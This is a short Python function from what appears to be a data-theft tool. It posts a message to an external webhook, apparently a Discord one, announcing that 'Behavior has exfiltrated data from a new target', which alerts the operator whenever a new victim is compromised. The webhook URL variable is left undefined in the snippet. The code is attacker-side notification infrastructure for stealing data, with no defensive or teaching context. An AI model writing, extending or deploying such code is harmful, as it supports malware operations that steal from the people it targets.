import requests


def ping_option(option):
    data = {
        "content": f"@{option} Behavior has exfiltrated data from a new target!",
        "username": "Behavior Notification",
        "avatar_url": "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"
    }

    try:
        response = requests.post(Behavior, json=data)
        if response.status_code != 204:
            print(f"[!] Failed to ping with status code: {response.status_code}")
    except Exception as e:
        print(f"[!] Error during webhook ping: {e}")
